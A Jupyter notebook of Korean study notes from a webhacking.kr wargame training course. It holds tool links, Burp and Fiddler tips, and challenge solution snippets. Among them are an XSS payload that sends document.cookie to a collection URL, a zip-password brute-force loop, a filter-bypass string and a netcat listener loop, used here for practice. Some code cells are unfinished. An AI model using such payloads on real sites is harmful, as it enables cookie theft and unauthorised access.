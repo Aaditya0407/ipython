{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Webhacking Training Day01"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 목차\n",
    "\n",
    "### 1일차\n",
    "\n",
    "- 이론 및 실습 준비\n",
    "- 난이도 하 문제 풀이(자바스크립트, 파라미터 변조)\n",
    "\n",
    "### 2일차\n",
    "\n",
    "- 난이도 중 문제 풀이(파라미터 변조, XSS 등)\n",
    "\n",
    "### 3일차\n",
    "\n",
    "- 난이도 중 ~ 상 문제 풀이(SQL Injection)\n",
    "\n",
    "### 결론\n",
    "\n",
    "- webhacking.kr All Clear!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 필요 프로그램들\n",
    "\n",
    "- [Download Burp Suite](https://portswigger.net/burp/download.html)\n",
    "  - [Java SE Development Kit 8 \\- Downloads](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)\n",
    "- [Download Fiddler Web Debugging Tool for Free by Telerik](http://www.telerik.com/download/fiddler)\n",
    "\n",
    "### 기본적인 웹 해킹 개념 및 책\n",
    "\n",
    "- [군대에 온 남자 :: Web Application 해킹](http://kimdongwook.tistory.com/33): 웹 해킹에 대한 전반적인 사항들. 자료들 좋음. 원저작자는 코어 시큐리티인듯?\n",
    "- [탁구치는 개발자 :: Burp Suite 사용법 정리](http://lng1982.tistory.com/139)\n",
    "- [\\[도서\\] 피들러 완벽 가이드, 에릭 로렌스 저/김태곤 역, 9788993827637 | YES24 상품정보](http://www.yes24.com/24/goods/11006370?scode=032&OzSrank=2): 피들러 자세한 사용법\n",
    "\n",
    "\n",
    "### 활용 가능 사이트\n",
    "\n",
    "- [codepad](http://codepad.org/): 코드를 온라인 상으로 테스트 해볼 수 있는 사이트\n",
    "- [webhacking base64](http://webhacking.kr/b64.php): base64 인코딩, 디코딩\n",
    "- [Online JavaScript beautifier](http://jsbeautifier.org/): js를 예쁘게 보여줘서 코드 가독성 높임"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 피드백 사이트들\n",
    "\n",
    "- [문자 인코딩 \\- 위키백과, 우리 모두의 백과사전](https://ko.wikipedia.org/wiki/%EB%AC%B8%EC%9E%90_%EC%9D%B8%EC%BD%94%EB%94%A9)\n",
    "- [베이스64 \\- 위키백과, 우리 모두의 백과사전](https://ko.wikipedia.org/wiki/%EB%B2%A0%EC%9D%B4%EC%8A%A464): 인코딩\n",
    "- [고급 암호화 표준 \\- 위키백과, 우리 모두의 백과사전](https://ko.wikipedia.org/wiki/%EA%B3%A0%EA%B8%89_%EC%95%94%ED%98%B8%ED%99%94_%ED%91%9C%EC%A4%80): 암호화\n",
    "- [Javascript Cheat Sheet | OverAPI.com](http://overapi.com/javascript/)\n",
    "- [Online regex tester and debugger: JavaScript, Python, PHP, and PCRE](https://regex101.com)\n",
    "- [Burp Suite: Video Tutorials](https://portswigger.net/burp/tutorials/): 오 동영상에 영어 자막까지 들어 있어서 좋다. 그냥 영어만 들으면 뭔 소린지 잘 이해가 안됐는데\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 후기\n",
    "\n",
    "- 요즘에는 거의 개발만 했는데 웹해킹도 재밌네. 물론 예전보다 조금은 공부를 더 해서 그런지 몰라도 문제들이 좀 쉽게 풀렸음\n",
    "- 올클하고 나서는 위챌을 풀어보라는 추천을 받았다.\n",
    "\n",
    "## 피드백\n",
    "\n",
    "- 그림이 거의 없었다.\n",
    "  <img src=\"http://psd0828.iisweb.co.kr/files/attach/images/1388/888/004/b545cd1a816e6ecbb6c130866a725450.jpg\" width=200 />\n",
    "- 인코딩 방법들도(base64, AES, etc) 여러가지 소개해 주면 좋겠다.\n",
    "- 설명할 때 패킷 캡쳐해서 사용하는 그림도 넣어주면 좋겠다.\n",
    "- 버프, 피들러 기본적인 사용법 필요\n",
    "- PPT와 웹사이트에 현재 몇 번 문제를 푸는지 번호를 넣어주면 좋겠다.\n",
    "- 강의 방식 변경 요청\n",
    "  - 처음에 설명없이 2분 정도 직접 풀어보고\n",
    "  - 그 다음에 문제에 대해 설명하고\n",
    "  - 그때 다시 문제를 풀어보고\n",
    "  - 최종 풀이 과정 설명\n",
    "- 치트시트 자바스크립트 함수, 자바스크립트 API 사이트\n",
    "  - 우리가 가져가는건 자료다. 나중에 다시 확인해 보면서 공부할 수 있는.(물론 많은 사람들이 잘 안하지만..)\n",
    "- 정규 표현식은 암호문과 같기 때문에 쉽게 표현해 주는 사이트로 설명\n",
    "- webhacking.kr을 운영하면서 기억에 남는 에피소드 설명(수업 분위기가 지루해질때)\n",
    "  - 3번 정도 크게 뚫린 적이 있는데 거기에서 어떤 취약점을 통해서 들어왔고 어떻게 문제들을 업데이트 했는지 히스토리들?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Burp suite 실행 방법 in command-line\n",
    "\n",
    "```shell\n",
    "$ java -jar -Xmx1024m burpsuite_free_v1.6.01.jar\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 피들러\n",
    "\n",
    "- F11: \n",
    "- F12: 패킷캡처 활성/비활성화 "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 가입 문제\n",
    "\n",
    "- [베이스64 \\- 위키백과, 우리 모두의 백과사전](https://ko.wikipedia.org/wiki/%EB%B2%A0%EC%9D%B4%EC%8A%A464)\n",
    "\n",
    "\n",
    "- 웹 페이지 쉘 따인거 에피소드"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 웹해킹 10번\n",
    "\n",
    "- location.href='?go=800'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## sha1\n",
    "\n",
    "- [Albertech Blog: Generate a SHA1 hash from the command\\-line in OS X](http://albertech.blogspot.kr/2011/08/generate-sha1-hash-from-command-line-in_29.html)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false,
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "40d5cabd932d821400ea9144a3c356ac056f80c6\r\n"
     ]
    }
   ],
   "source": [
    "!echo -n password | shasum -a 1 | awk '{print $1}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "40D5CABD932D821400EA9144A3C356AC056F80C6\r\n"
     ]
    }
   ],
   "source": [
    "!echo -n password | shasum -a 1 | awk '{print toupper($1)}'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "s = 'e358efa489f58062f10dd7316b65649ee1671797c52e15f763380b45e841ec3203c7c0ace395d80182db07ae2c30f034e358efa489f58062f10dd7316b65649e'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "128"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "for i, str_ in s:\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import hashlib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "hashlib.md5("
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## zip 파일 Brute Forcing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import zipfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def open_zip(path):\n",
    "    return zipfile.ZipFile(path)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "def extract(f, CNT=1000):\n",
    "    for i in range(CNT):\n",
    "        try:\n",
    "            f.extractall(pwd=str(i))\n",
    "        except Exception as e:\n",
    "            pass\n",
    "        else:\n",
    "            print i"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "852\n"
     ]
    }
   ],
   "source": [
    "path = 'src/test.zip'\n",
    "f = open_zip(path)\n",
    "extract(f, CNT=1000)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- http://webhacking.kr/challenge/bonus/bonus-11 : Header Injection 문제\n",
    "- http://webhacking.kr/challenge/web/web-27/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- LFI\n",
    "- http://webhacking.kr/test_xss/xss.php\n",
    "- http://webhacking.kr/get.php?ck=test\n",
    "        <script>location.href = 'http://webhacking.kr/get.php?ck=' + document.cookie;</script>\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 정규표현식 문제\n",
    "\n",
    "- 1aaaaa_a125.131.189.61.%09p%09a%09s%09s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "\n",
    "- http://192.168.32.103/web/web-16/?server=192.168.32.103"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- for ((i=10000;i<=10100;i++)); do nc -l $i & done\n",
    "- 쉘스크립트를 사용하여 Port Open\n",
    "- netstat -na | grep tcp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
